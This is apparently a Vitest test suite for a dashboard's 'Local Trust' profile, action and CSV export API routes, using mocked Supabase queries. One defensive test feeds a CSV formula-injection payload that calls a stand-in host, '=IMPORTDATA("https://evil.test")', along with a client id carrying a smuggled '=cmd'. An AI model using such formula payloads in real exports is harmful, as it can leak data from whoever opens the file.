import { beforeEach, describe, expect, it, vi } from 'vitest'

type TableError = { message: string; code?: string }
type TableResult = { data: unknown; error?: TableError | null }
type QueryCall = {
  table: string
  operation?: string
  payload?: unknown
  options?: unknown
  filters: Array<[string, unknown]>
  limitCount?: number
}

const { mockCalculateLocalTrust, mockGetProfile, mockFrom, tableResults, queryCalls } = vi.hoisted(() => ({
  mockCalculateLocalTrust: vi.fn(),
  mockGetProfile: vi.fn(),
  mockFrom: vi.fn(),
  tableResults: new Map<string, TableResult>(),
  queryCalls: [] as QueryCall[],
}))

class QueryBuilder {
  call: QueryCall

  constructor(table: string) {
    this.call = { table, filters: [] }
    queryCalls.push(this.call)
  }

  select() {
    this.call.operation ??= 'select'
    return this
  }

  upsert(payload: unknown, options?: unknown) {
    this.call.operation = 'upsert'
    this.call.payload = payload
    this.call.options = options
    return this
  }

  update(payload: unknown) {
    this.call.operation = 'update'
    this.call.payload = payload
    return this
  }

  eq(column: string, value: unknown) {
    this.call.filters.push([column, value])
    return this
  }

  order() {
    return this
  }

  limit(count: number) {
    this.call.limitCount = count
    return this
  }

  async single() {
    return tableResults.get(this.call.table) ?? { data: null, error: null }
  }

  async then(resolve: (value: TableResult) => unknown) {
    return resolve(tableResults.get(this.call.table) ?? { data: null, error: null })
  }
}

vi.mock('@/lib/auth', () => ({ getProfile: mockGetProfile }))
vi.mock('@/lib/supabase-server', () => ({
  createServerSupabaseClient: vi.fn(async () => ({ from: mockFrom })),
}))
vi.mock('@/lib/localTrust/scoring', () => ({ calculateLocalTrust: mockCalculateLocalTrust }))

import { PUT as PUT_PROFILE } from '@/app/api/dashboard/clients/[clientId]/local-trust/profile/route'
import { PATCH as PATCH_ACTION } from '@/app/api/dashboard/clients/[clientId]/local-trust/actions/[actionId]/route'
import { GET as GET_EXPORT } from '@/app/api/dashboard/clients/[clientId]/local-trust/export/route'
import { getOrCreateLocalTrustSnapshot } from '@/lib/localTrust/store'

function setTable(table: string, data: unknown, error: TableError | null = null) {
  tableResults.set(table, { data, error })
}

function jsonRequest(url: string, method: string, body: unknown) {
  return new Request(url, {
    method,
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(body),
  })
}

function rawJsonRequest(url: string, method: string, body: string) {
  return new Request(url, {
    method,
    headers: { 'Content-Type': 'application/json' },
    body,
  })
}

describe('Local Trust profile route', () => {
  beforeEach(() => {
    vi.clearAllMocks()
    tableResults.clear()
    queryCalls.length = 0
    mockFrom.mockImplementation((table: string) => new QueryBuilder(table))
    mockGetProfile.mockResolvedValue({
      account_id: 'account-1',
      accounts: { plan: 'pro', status: 'active', stripe_subscription_id: 'sub_pro', trial_ends_at: null },
    })
  })

  it('rejects unauthenticated profile updates', async () => {
    mockGetProfile.mockResolvedValue(null)

    const req = jsonRequest('http://localhost/api/dashboard/clients/client-1/local-trust/profile', 'PUT', {})
    const res = await PUT_PROFILE(req, { params: Promise.resolve({ clientId: 'client-1' }) })

    expect(res.status).toBe(401)
    expect(mockFrom).not.toHaveBeenCalled()
  })

  it('rejects Basic users', async () => {
    mockGetProfile.mockResolvedValue({ account_id: 'account-1', accounts: { plan: 'basic', status: 'active', stripe_subscription_id: 'sub_basic', trial_ends_at: null } })

    const req = jsonRequest('http://localhost/api/dashboard/clients/client-1/local-trust/profile', 'PUT', {})
    const res = await PUT_PROFILE(req, { params: Promise.resolve({ clientId: 'client-1' }) })
    const body = await res.json()

    expect(res.status).toBe(403)
    expect(body).toMatchObject({ error: 'UPGRADE_REQUIRED', feature: 'local_trust_roi', plan: 'basic' })
    expect(mockFrom).not.toHaveBeenCalled()
  })

  it('upserts sanitized owner assumptions for owned clients', async () => {
    setTable('clients', { id: 'client-1', account_id: 'account-1' })
    setTable('local_trust_profiles', { id: 'profile-1', client_id: 'client-1', account_id: 'account-1' })

    const req = jsonRequest('http://localhost/api/dashboard/clients/client-1/local-trust/profile', 'PUT', {
      primary_services: [' Tax Advisory ', '', 'Company Secretary'],
      service_area: ' Hong Kong ',
      average_lead_value: '20000',
      close_rate: '0.25',
      competitors: [' rival.example ', '', 'Example Ltd'],
    })
    const res = await PUT_PROFILE(req, { params: Promise.resolve({ clientId: 'client-1' }) })

    expect(res.status).toBe(200)
    expect(mockFrom).toHaveBeenCalledWith('clients')
    expect(mockFrom).toHaveBeenCalledWith('local_trust_profiles')

    const ownershipCall = queryCalls.find(call => call.table === 'clients')
    expect(ownershipCall?.filters).toEqual([
      ['id', 'client-1'],
      ['account_id', 'account-1'],
    ])

    const upsertCall = queryCalls.find(call => call.table === 'local_trust_profiles')
    expect(upsertCall?.operation).toBe('upsert')
    expect(upsertCall?.options).toEqual({ onConflict: 'client_id' })
    expect(upsertCall?.payload).toMatchObject({
      client_id: 'client-1',
      account_id: 'account-1',
      primary_services: ['Tax Advisory', 'Company Secretary'],
      service_area: 'Hong Kong',
      average_lead_value: 20000,
      close_rate: 0.25,
      competitors: ['rival.example', 'Example Ltd'],
    })
    expect((upsertCall?.payload as { updated_at?: string }).updated_at).toEqual(expect.any(String))
  })

  it('rejects close rates above 1', async () => {
    setTable('clients', { id: 'client-1', account_id: 'account-1' })

    const req = jsonRequest('http://localhost/api/dashboard/clients/client-1/local-trust/profile', 'PUT', {
      close_rate: '1.25',
    })
    const res = await PUT_PROFILE(req, { params: Promise.resolve({ clientId: 'client-1' }) })

    expect(res.status).toBe(400)
    expect(mockFrom).toHaveBeenCalledWith('clients')
    expect(mockFrom).not.toHaveBeenCalledWith('local_trust_profiles')
  })

  it('rejects negative or nonnumeric owner assumptions instead of clearing them', async () => {
    setTable('clients', { id: 'client-1', account_id: 'account-1' })

    const negativeReq = jsonRequest('http://localhost/api/dashboard/clients/client-1/local-trust/profile', 'PUT', {
      average_lead_value: '-1',
    })
    const negativeRes = await PUT_PROFILE(negativeReq, { params: Promise.resolve({ clientId: 'client-1' }) })

    expect(negativeRes.status).toBe(400)
    expect(mockFrom).not.toHaveBeenCalledWith('local_trust_profiles')

    vi.clearAllMocks()
    queryCalls.length = 0
    mockFrom.mockImplementation((table: string) => new QueryBuilder(table))
    setTable('clients', { id: 'client-1', account_id: 'account-1' })

    const nonnumericReq = jsonRequest('http://localhost/api/dashboard/clients/client-1/local-trust/profile', 'PUT', {
      close_rate: 'not-a-number',
    })
    const nonnumericRes = await PUT_PROFILE(nonnumericReq, { params: Promise.resolve({ clientId: 'client-1' }) })

    expect(nonnumericRes.status).toBe(400)
    expect(mockFrom).not.toHaveBeenCalledWith('local_trust_profiles')
  })

  it('does not leak raw profile store errors in 500 responses', async () => {
    setTable('clients', { id: 'client-1', account_id: 'account-1' })
    setTable('local_trust_profiles', null, { message: 'sensitive profile policy failure' })

    const req = jsonRequest('http://localhost/api/dashboard/clients/client-1/local-trust/profile', 'PUT', {
      average_lead_value: '20000',
    })
    const res = await PUT_PROFILE(req, { params: Promise.resolve({ clientId: 'client-1' }) })
    const body = await res.json()

    expect(res.status).toBe(500)
    expect(body).toEqual({ error: 'Profile update failed' })
    expect(JSON.stringify(body)).not.toContain('sensitive profile policy failure')
  })

  it('returns 400 for malformed profile JSON', async () => {
    setTable('clients', { id: 'client-1', account_id: 'account-1' })

    const req = rawJsonRequest('http://localhost/api/dashboard/clients/client-1/local-trust/profile', 'PUT', '{')
    const res = await PUT_PROFILE(req, { params: Promise.resolve({ clientId: 'client-1' }) })

    expect(res.status).toBe(400)
    expect(mockFrom).not.toHaveBeenCalledWith('local_trust_profiles')
  })
})

describe('Local Trust action route', () => {
  beforeEach(() => {
    vi.clearAllMocks()
    tableResults.clear()
    queryCalls.length = 0
    mockFrom.mockImplementation((table: string) => new QueryBuilder(table))
    mockGetProfile.mockResolvedValue({
      account_id: 'account-1',
      accounts: { plan: 'pro', status: 'active', stripe_subscription_id: 'sub_pro', trial_ends_at: null },
    })
  })

  it('rejects invalid action statuses', async () => {
    setTable('clients', { id: 'client-1', account_id: 'account-1' })

    const req = jsonRequest('http://localhost/api/dashboard/clients/client-1/local-trust/actions/action-1', 'PATCH', {
      status: 'archived',
    })
    const res = await PATCH_ACTION(req, { params: Promise.resolve({ clientId: 'client-1', actionId: 'action-1' }) })

    expect(res.status).toBe(400)
    expect(mockFrom).not.toHaveBeenCalledWith('local_trust_actions')
  })

  it('updates an owned action status by client and action id', async () => {
    setTable('clients', { id: 'client-1', account_id: 'account-1' })
    setTable('local_trust_actions', {
      id: 'action-1',
      client_id: 'client-1',
      status: 'done',
    })

    const req = jsonRequest('http://localhost/api/dashboard/clients/client-1/local-trust/actions/action-1', 'PATCH', {
      status: 'done',
    })
    const res = await PATCH_ACTION(req, { params: Promise.resolve({ clientId: 'client-1', actionId: 'action-1' }) })

    expect(res.status).toBe(200)
    const updateCall = queryCalls.find(call => call.table === 'local_trust_actions')
    expect(updateCall?.operation).toBe('update')
    expect(updateCall?.filters).toEqual([
      ['id', 'action-1'],
      ['client_id', 'client-1'],
    ])
    expect(updateCall?.payload).toMatchObject({ status: 'done' })
    expect((updateCall?.payload as { updated_at?: string }).updated_at).toEqual(expect.any(String))
  })

  it('returns 404 when the action update returns no row', async () => {
    setTable('clients', { id: 'client-1', account_id: 'account-1' })
    setTable('local_trust_actions', null)

    const req = jsonRequest('http://localhost/api/dashboard/clients/client-1/local-trust/actions/action-404', 'PATCH', {
      status: 'planned',
    })
    const res = await PATCH_ACTION(req, { params: Promise.resolve({ clientId: 'client-1', actionId: 'action-404' }) })

    expect(res.status).toBe(404)
  })

  it('does not leak raw action store errors in 500 responses', async () => {
    setTable('clients', { id: 'client-1', account_id: 'account-1' })
    setTable('local_trust_actions', null, { message: 'sensitive action policy failure' })

    const req = jsonRequest('http://localhost/api/dashboard/clients/client-1/local-trust/actions/action-1', 'PATCH', {
      status: 'planned',
    })
    const res = await PATCH_ACTION(req, { params: Promise.resolve({ clientId: 'client-1', actionId: 'action-1' }) })
    const body = await res.json()

    expect(res.status).toBe(500)
    expect(body).toEqual({ error: 'Action update failed' })
    expect(JSON.stringify(body)).not.toContain('sensitive action policy failure')
  })

  it('returns 400 for malformed action JSON', async () => {
    setTable('clients', { id: 'client-1', account_id: 'account-1' })

    const req = rawJsonRequest('http://localhost/api/dashboard/clients/client-1/local-trust/actions/action-1', 'PATCH', '{')
    const res = await PATCH_ACTION(req, { params: Promise.resolve({ clientId: 'client-1', actionId: 'action-1' }) })

    expect(res.status).toBe(400)
    expect(mockFrom).not.toHaveBeenCalledWith('local_trust_actions')
  })
})

describe('Local Trust export route', () => {
  beforeEach(() => {
    vi.clearAllMocks()
    tableResults.clear()
    queryCalls.length = 0
    mockFrom.mockImplementation((table: string) => new QueryBuilder(table))
    mockGetProfile.mockResolvedValue({
      account_id: 'account-1',
      accounts: { plan: 'enterprise', status: 'active', stripe_subscription_id: 'sub_enterprise', trial_ends_at: null },
    })
    mockCalculateLocalTrust.mockReturnValue({
      client_id: 'client-1',
      account_id: 'account-1',
      snapshot_month: '2026-06-01',
      local_trust_score: 71,
      bucket_scores: [],
      trust_gaps: [{
        stableKey: 'quoted-proof',
        title: 'Add "quoted" proof',
        bucket: 'proof_depth',
        impact: 'high',
        effort: 'medium',
        rationale: 'Proof is thin.',
        suggestedTarget: 'Case studies',
      }],
      roi_estimate: {
        low: 12000,
        high: 28000,
        currency: 'HKD',
        assumptions: {
          averageLeadValue: 8000,
          closeRate: 0.25,
          estimatedExtraEnquiriesLow: 6,
          estimatedExtraEnquiriesHigh: 14,
        },
        confidence: 'directional',
      },
      source_scan_id: 'scan-1',
      source_pulse_week: '2026-06-22',
    })
  })

  function setOwnedClient(overrides: Record<string, unknown> = {}) {
    setTable('clients', {
      id: 'client-1',
      brand_name: 'Harbour Advisory',
      domain: 'harbour.example',
      industry: 'legal',
      competitors: [],
      status: 'active',
      created_at: '2026-06-01T00:00:00.000Z',
      ...overrides,
    })
  }

  function setSavedSnapshot(overrides: Record<string, unknown> = {}) {
    setTable('local_trust_snapshots', {
      id: 'snapshot-1',
      client_id: 'client-1',
      account_id: 'account-1',
      snapshot_month: '2026-06-01',
      local_trust_score: 71,
      bucket_scores: [],
      trust_gaps: [],
      roi_estimate: null,
      source_scan_id: null,
      source_pulse_week: null,
      created_at: '2026-06-28T00:00:00.000Z',
      ...overrides,
    })
  }

  function setNoMatchingScan() {
    setTable('scans', {
      id: 'scan-other',
      url: 'https://other.example',
      domain: 'other.example',
      score: 82,
      grade: 'A',
      results: {},
      account_id: 'account-1',
      created_at: '2026-06-28T00:00:00.000Z',
    })
  }

  function setEmptyExportTables() {
    setTable('local_trust_profiles', null)
    setTable('pulse_metrics', [])
    setTable('agent_competitors', [])
    setSavedSnapshot()
    setTable('local_trust_actions', [])
  }

  it('rejects Pro users because export is Enterprise-only', async () => {
    mockGetProfile.mockResolvedValue({ account_id: 'account-1', accounts: { plan: 'pro', status: 'active', stripe_subscription_id: 'sub_pro', trial_ends_at: null } })

    const req = new Request('http://localhost/api/dashboard/clients/client-1/local-trust/export')
    const res = await GET_EXPORT(req, { params: Promise.resolve({ clientId: 'client-1' }) })
    const body = await res.json()

    expect(res.status).toBe(403)
    expect(body).toMatchObject({ error: 'UPGRADE_REQUIRED', feature: 'local_trust_export', plan: 'pro' })
    expect(mockFrom).not.toHaveBeenCalled()
  })

  it('exports an Enterprise CSV using owned client and Local Trust snapshot data', async () => {
    setTable('clients', {
      id: 'client-1',
      brand_name: 'Harbour Advisory',
      domain: 'https://www.harbour.example/path',
      industry: 'legal',
      competitors: [],
      status: 'active',
      created_at: '2026-06-01T00:00:00.000Z',
    })
    setTable('scans', {
      id: 'scan-1',
      url: 'https://harbour.example',
      domain: 'harbour.example',
      score: 82,
      grade: 'A',
      results: {},
      account_id: 'account-1',
      created_at: '2026-06-28T00:00:00.000Z',
    })
    setTable('local_trust_profiles', {
      id: 'profile-1',
      client_id: 'client-1',
      account_id: 'account-1',
      primary_services: ['AISO consulting'],
      service_area: 'Hong Kong',
      average_lead_value: 8000,
      close_rate: 0.25,
      competitors: [],
      created_at: '2026-06-01T00:00:00.000Z',
      updated_at: '2026-06-01T00:00:00.000Z',
    })
    setTable('pulse_weekly_summary', [{
      id: 'summary-1',
      client_id: 'client-1',
      scan_week: '2026-06-22',
      platform: null,
      total_queries: 10,
      brand_mentions: 4,
      sov_score: 40,
      avg_sentiment_score: 0.4,
      top_competitors: {},
      created_at: '2026-06-22T00:00:00.000Z',
    }])
    setTable('pulse_metrics', [{
      id: 'metric-1',
      client_id: 'client-1',
      prompt_id: 'prompt-1',
      platform: 'gemini',
      question: 'best local advisor',
      raw_answer: null,
      brand_mentioned: false,
      sentiment: 'not_mentioned',
      mention_position: null,
      competitors_mentioned: ['rival.example'],
      scan_week: '2026-06-22',
      created_at: '2026-06-22T00:00:00.000Z',
    }])
    setTable('agent_competitors', [{
      id: 'competitor-1',
      scan_id: 'scan-1',
      platform: 'perplexity',
      competitor_domain: 'rival.example',
      competitor_name: 'Rival Advisory',
      mention_rate: 52,
      your_rate: 18,
      gap_analysis: 'Rival has more local proof.',
      created_at: '2026-06-28T00:00:00.000Z',
    }])
    setTable('local_trust_snapshots', {
      id: 'snapshot-1',
      client_id: 'client-1',
      account_id: 'account-1',
      snapshot_month: '2026-06-01',
      local_trust_score: 71,
      bucket_scores: [],
      trust_gaps: [],
      roi_estimate: {
        low: 12000,
        high: 28000,
        currency: 'HKD',
        assumptions: {
          averageLeadValue: 8000,
          closeRate: 0.25,
          estimatedExtraEnquiriesLow: 6,
          estimatedExtraEnquiriesHigh: 14,
        },
        confidence: 'directional',
      },
      source_scan_id: 'scan-1',
      source_pulse_week: '2026-06-22',
      created_at: '2026-06-28T00:00:00.000Z',
    })
    setTable('local_trust_actions', [{
      id: 'action-1',
      client_id: 'client-1',
      snapshot_id: 'snapshot-1',
      stable_key: 'quoted-proof',
      title: 'Old title',
      bucket: 'proof_depth',
      impact: 'high',
      effort: 'medium',
      status: 'open',
      created_at: '2026-06-28T00:00:00.000Z',
      updated_at: '2026-06-28T00:00:00.000Z',
    }])

    const req = new Request('http://localhost/api/dashboard/clients/client-1/local-trust/export')
    const res = await GET_EXPORT(req, { params: Promise.resolve({ clientId: 'client-1' }) })
    const csv = await res.text()

    expect(res.status).toBe(200)
    expect(res.headers.get('content-type')).toContain('text/csv; charset=utf-8')
    expect(res.headers.get('content-disposition')).toBe('attachment; filename="local-trust-client-1.csv"')
    expect(csv).toContain('Metric,Value')
    expect(csv).toContain('Local Trust Score,71')
    expect(csv).toContain('Snapshot Month,2026-06-01')
    expect(csv).toContain('Top Action,"Add ""quoted"" proof"')
    expect(csv).toContain('Estimated Value Low,12000')
    expect(csv).toContain('Estimated Value High,28000')
    expect(queryCalls.find(call => call.table === 'clients')?.filters).toEqual([
      ['id', 'client-1'],
      ['account_id', 'account-1'],
    ])
    expect(queryCalls.find(call => call.table === 'scans')?.limitCount).toBe(25)
    expect(queryCalls.find(call => call.table === 'agent_competitors')?.filters).toEqual([['scan_id', 'scan-1']])
    expect(mockCalculateLocalTrust).toHaveBeenCalledWith(expect.objectContaining({
      accountId: 'account-1',
      scan: expect.objectContaining({ id: 'scan-1' }),
      competitors: [expect.objectContaining({ id: 'competitor-1' })],
    }))
  })

  it('does not use an account latest scan or competitors when an aggregate Pulse baseline exists but the scan domain does not match', async () => {
    setOwnedClient()
    setNoMatchingScan()
    setTable('local_trust_profiles', null)
    setTable('pulse_weekly_summary', [{
      id: 'summary-aggregate',
      client_id: 'client-1',
      scan_week: '2026-06-22',
      platform: null,
      total_queries: 10,
      brand_mentions: 4,
      sov_score: 40,
      avg_sentiment_score: 0.4,
      top_competitors: {},
      created_at: '2026-06-22T00:00:00.000Z',
    }])
    setTable('pulse_metrics', [])
    setTable('agent_competitors', [{
      id: 'competitor-other',
      scan_id: 'scan-other',
      platform: 'perplexity',
      competitor_domain: 'rival.example',
      competitor_name: 'Rival Advisory',
      mention_rate: 52,
      your_rate: 18,
      gap_analysis: 'Wrong scan.',
      created_at: '2026-06-28T00:00:00.000Z',
    }])
    setSavedSnapshot({ local_trust_score: 58 })
    setTable('local_trust_actions', [])

    const req = new Request('http://localhost/api/dashboard/clients/client-1/local-trust/export')
    const res = await GET_EXPORT(req, { params: Promise.resolve({ clientId: 'client-1' }) })

    expect(res.status).toBe(200)
    expect(queryCalls.some(call => call.table === 'agent_competitors')).toBe(false)
    expect(mockCalculateLocalTrust).toHaveBeenCalledWith(expect.objectContaining({
      scan: null,
      competitors: [],
    }))
  })

  it('uses the newest matching client scan instead of the newest scan from another account brand', async () => {
    setOwnedClient()
    setTable('scans', [
      {
        id: 'scan-other-newest',
        url: 'https://other.example',
        domain: 'other.example',
        score: 91,
        grade: 'A',
        results: {},
        account_id: 'account-1',
        created_at: '2026-06-28T00:00:00.000Z',
      },
      {
        id: 'scan-harbour-older',
        url: 'https://harbour.example',
        domain: 'harbour.example',
        score: 82,
        grade: 'A',
        results: {},
        account_id: 'account-1',
        created_at: '2026-06-20T00:00:00.000Z',
      },
    ])
    setTable('pulse_weekly_summary', [])
    setEmptyExportTables()

    const req = new Request('http://localhost/api/dashboard/clients/client-1/local-trust/export')
    const res = await GET_EXPORT(req, { params: Promise.resolve({ clientId: 'client-1' }) })

    expect(res.status).toBe(200)
    expect(queryCalls.find(call => call.table === 'agent_competitors')?.filters).toEqual([['scan_id', 'scan-harbour-older']])
    expect(mockCalculateLocalTrust).toHaveBeenCalledWith(expect.objectContaining({
      scan: expect.objectContaining({ id: 'scan-harbour-older' }),
    }))
  })

  it('requires a matching scan or aggregate Pulse baseline before creating an export snapshot', async () => {
    setOwnedClient()
    setNoMatchingScan()
    setTable('pulse_weekly_summary', [])
    setEmptyExportTables()

    const req = new Request('http://localhost/api/dashboard/clients/client-1/local-trust/export')
    const res = await GET_EXPORT(req, { params: Promise.resolve({ clientId: 'client-1' }) })
    const body = await res.json()

    expect(res.status).toBe(409)
    expect(body).toEqual({ error: 'LOCAL_TRUST_BASELINE_REQUIRED' })
    expect(mockCalculateLocalTrust).not.toHaveBeenCalled()
    expect(queryCalls.some(call => call.table === 'local_trust_snapshots')).toBe(false)
    expect(queryCalls.some(call => call.table === 'local_trust_actions')).toBe(false)
  })

  it('does not count platform-only Pulse summary rows as an aggregate export baseline', async () => {
    setOwnedClient()
    setTable('scans', null)
    setTable('pulse_weekly_summary', [{
      id: 'summary-platform',
      client_id: 'client-1',
      scan_week: '2026-06-22',
      platform: 'gemini',
      total_queries: 10,
      brand_mentions: 4,
      sov_score: 40,
      avg_sentiment_score: 0.4,
      top_competitors: {},
      created_at: '2026-06-22T00:00:00.000Z',
    }])
    setEmptyExportTables()

    const req = new Request('http://localhost/api/dashboard/clients/client-1/local-trust/export')
    const res = await GET_EXPORT(req, { params: Promise.resolve({ clientId: 'client-1' }) })
    const body = await res.json()

    expect(res.status).toBe(409)
    expect(body).toEqual({ error: 'LOCAL_TRUST_BASELINE_REQUIRED' })
    expect(mockCalculateLocalTrust).not.toHaveBeenCalled()
    expect(queryCalls.some(call => call.table === 'local_trust_snapshots')).toBe(false)
  })

  it('returns a generic 500 and does not create a snapshot when the latest scan query fails', async () => {
    setOwnedClient()
    setTable('scans', null, { message: 'sensitive scans policy failure' })
    setTable('pulse_weekly_summary', [{
      id: 'summary-aggregate',
      client_id: 'client-1',
      scan_week: '2026-06-22',
      platform: null,
      total_queries: 10,
      brand_mentions: 4,
      sov_score: 40,
      avg_sentiment_score: 0.4,
      top_competitors: {},
      created_at: '2026-06-22T00:00:00.000Z',
    }])
    setEmptyExportTables()

    const req = new Request('http://localhost/api/dashboard/clients/client-1/local-trust/export')
    const res = await GET_EXPORT(req, { params: Promise.resolve({ clientId: 'client-1' }) })
    const body = await res.json()

    expect(res.status).toBe(500)
    expect(body).toEqual({ error: 'Export failed' })
    expect(JSON.stringify(body)).not.toContain('sensitive scans policy failure')
    expect(mockCalculateLocalTrust).not.toHaveBeenCalled()
    expect(queryCalls.some(call => call.table === 'local_trust_snapshots')).toBe(false)
  })

  it('returns a generic 500 and does not create a snapshot when Pulse or competitor queries fail', async () => {
    for (const table of ['pulse_weekly_summary', 'pulse_metrics', 'agent_competitors']) {
      vi.clearAllMocks()
      tableResults.clear()
      queryCalls.length = 0
      mockFrom.mockImplementation((name: string) => new QueryBuilder(name))
      mockGetProfile.mockResolvedValue({
        account_id: 'account-1',
        accounts: { plan: 'enterprise', status: 'active', stripe_subscription_id: 'sub_enterprise', trial_ends_at: null },
      })
      setOwnedClient()
      setTable('scans', {
        id: 'scan-1',
        url: 'https://harbour.example',
        domain: 'harbour.example',
        score: 82,
        grade: 'A',
        results: {},
        account_id: 'account-1',
        created_at: '2026-06-28T00:00:00.000Z',
      })
      setTable('pulse_weekly_summary', [{
        id: 'summary-aggregate',
        client_id: 'client-1',
        scan_week: '2026-06-22',
        platform: null,
        total_queries: 10,
        brand_mentions: 4,
        sov_score: 40,
        avg_sentiment_score: 0.4,
        top_competitors: {},
        created_at: '2026-06-22T00:00:00.000Z',
      }])
      setTable('pulse_metrics', [])
      setTable('agent_competitors', [])
      setTable(table, null, { message: `sensitive ${table} failure` })
      setTable('local_trust_profiles', null)
      setSavedSnapshot()
      setTable('local_trust_actions', [])

      const req = new Request('http://localhost/api/dashboard/clients/client-1/local-trust/export')
      const res = await GET_EXPORT(req, { params: Promise.resolve({ clientId: 'client-1' }) })
      const body = await res.json()

      expect(res.status).toBe(500)
      expect(body).toEqual({ error: 'Export failed' })
      expect(JSON.stringify(body)).not.toContain(`sensitive ${table} failure`)
      expect(mockCalculateLocalTrust).not.toHaveBeenCalled()
      expect(queryCalls.some(call => call.table === 'local_trust_snapshots')).toBe(false)
    }
  })

  it('does not leak raw snapshot errors in 500 responses', async () => {
    setOwnedClient()
    setTable('scans', null)
    setTable('pulse_weekly_summary', [{
      id: 'summary-aggregate',
      client_id: 'client-1',
      scan_week: '2026-06-22',
      platform: null,
      total_queries: 10,
      brand_mentions: 4,
      sov_score: 40,
      avg_sentiment_score: 0.4,
      top_competitors: {},
      created_at: '2026-06-22T00:00:00.000Z',
    }])
    setTable('pulse_metrics', [])
    setTable('local_trust_profiles', null)
    setTable('local_trust_snapshots', null, { message: 'sensitive snapshot write failure' })

    const req = new Request('http://localhost/api/dashboard/clients/client-1/local-trust/export')
    const res = await GET_EXPORT(req, { params: Promise.resolve({ clientId: 'client-1' }) })
    const body = await res.json()

    expect(res.status).toBe(500)
    expect(body).toEqual({ error: 'Export failed' })
    expect(JSON.stringify(body)).not.toContain('sensitive snapshot write failure')
  })

  it('sanitizes export filenames and hardens formula-like CSV cells', async () => {
    mockCalculateLocalTrust.mockReturnValue({
      client_id: 'client/1 "=cmd',
      account_id: 'account-1',
      snapshot_month: '2026-06-01',
      local_trust_score: 71,
      bucket_scores: [],
      trust_gaps: [{
        stableKey: 'formula-action',
        title: '=IMPORTDATA("https://evil.test")',
        bucket: 'proof_depth',
        impact: 'high',
        effort: 'medium',
        rationale: 'Proof is thin.',
        suggestedTarget: 'Case studies',
      }],
      roi_estimate: null,
      source_scan_id: null,
      source_pulse_week: '2026-06-22',
    })
    setOwnedClient({ id: 'client/1 "=cmd' })
    setTable('scans', null)
    setTable('pulse_weekly_summary', [{
      id: 'summary-aggregate',
      client_id: 'client/1 "=cmd',
      scan_week: '2026-06-22',
      platform: null,
      total_queries: 10,
      brand_mentions: 4,
      sov_score: 40,
      avg_sentiment_score: 0.4,
      top_competitors: {},
      created_at: '2026-06-22T00:00:00.000Z',
    }])
    setTable('pulse_metrics', [])
    setTable('local_trust_profiles', null)
    setSavedSnapshot({ client_id: 'client/1 "=cmd', source_pulse_week: '2026-06-22' })
    setTable('local_trust_actions', [{
      id: 'action-formula',
      client_id: 'client/1 "=cmd',
      snapshot_id: 'snapshot-1',
      stable_key: 'formula-action',
      title: 'Old formula title',
      bucket: 'proof_depth',
      impact: 'high',
      effort: 'medium',
      status: 'open',
      created_at: '2026-06-28T00:00:00.000Z',
      updated_at: '2026-06-28T00:00:00.000Z',
    }])

    const req = new Request('http://localhost/api/dashboard/clients/client%2F1%20%22%3Dcmd/local-trust/export')
    const res = await GET_EXPORT(req, { params: Promise.resolve({ clientId: 'client/1 "=cmd' }) })
    const csv = await res.text()

    expect(res.status).toBe(200)
    expect(res.headers.get('content-disposition')).toBe('attachment; filename="local-trust-client-1-cmd.csv"')
    expect(csv).toContain('Top Action,"\'=IMPORTDATA(""https://evil.test"")"')
  })
})

describe('Local Trust snapshot store', () => {
  beforeEach(() => {
    vi.clearAllMocks()
    tableResults.clear()
    queryCalls.length = 0
    mockFrom.mockImplementation((table: string) => new QueryBuilder(table))
  })

  it('filters returned actions to refreshed gap keys and updates metadata while preserving statuses', async () => {
    mockCalculateLocalTrust.mockReturnValue({
      client_id: 'client-1',
      account_id: 'account-1',
      snapshot_month: '2026-06-01',
      local_trust_score: 64,
      bucket_scores: [],
      trust_gaps: [{
        stableKey: 'current-gap',
        title: 'Current gap',
        bucket: 'local_visibility',
        impact: 'high',
        effort: 'low',
        rationale: 'Current rationale',
        suggestedTarget: 'Service page',
      }],
      roi_estimate: null,
      source_scan_id: null,
      source_pulse_week: null,
    })
    setTable('local_trust_snapshots', {
      id: 'snapshot-1',
      client_id: 'client-1',
      account_id: 'account-1',
      snapshot_month: '2026-06-01',
      local_trust_score: 64,
      bucket_scores: [],
      trust_gaps: [],
      roi_estimate: null,
      source_scan_id: null,
      source_pulse_week: null,
      created_at: '2026-06-01T00:00:00.000Z',
    })
    setTable('local_trust_actions', [
      {
        id: 'action-current',
        snapshot_id: 'snapshot-1',
        stable_key: 'current-gap',
        title: 'Old gap title',
        bucket: 'proof_depth',
        impact: 'medium',
        effort: 'medium',
        status: 'done',
      },
      {
        id: 'action-stale',
        snapshot_id: 'snapshot-1',
        stable_key: 'stale-gap',
        title: 'Stale gap',
        bucket: 'proof_depth',
        impact: 'low',
        effort: 'low',
        status: 'open',
      },
    ])

    const result = await getOrCreateLocalTrustSnapshot({
      accountId: 'account-1',
      client: {
        id: 'client-1',
        brand_name: 'Harbour Advisory',
        domain: 'harbour.example',
        industry: 'legal',
        competitors: [],
        status: 'active',
        created_at: '2026-06-01T00:00:00.000Z',
      },
      latestScan: null,
      profile: null,
      pulseSummary: [],
      missed: [],
      competitors: [],
    })

    expect(result.actions).toEqual([
      expect.objectContaining({
        id: 'action-current',
        stable_key: 'current-gap',
        title: 'Current gap',
        bucket: 'local_visibility',
        impact: 'high',
        effort: 'low',
        status: 'done',
      }),
    ])
    expect(queryCalls.find(call => call.table === 'local_trust_actions' && call.operation === 'upsert')?.options)
      .toEqual({ onConflict: 'snapshot_id,stable_key', ignoreDuplicates: true })
    const metadataUpdate = queryCalls.find(call =>
      call.table === 'local_trust_actions' &&
      call.operation === 'update' &&
      call.filters.some(([column, value]) => column === 'stable_key' && value === 'current-gap')
    )
    expect(metadataUpdate?.payload).toMatchObject({
      title: 'Current gap',
      bucket: 'local_visibility',
      impact: 'high',
      effort: 'low',
    })
    expect(metadataUpdate?.payload).not.toHaveProperty('status')
  })
})
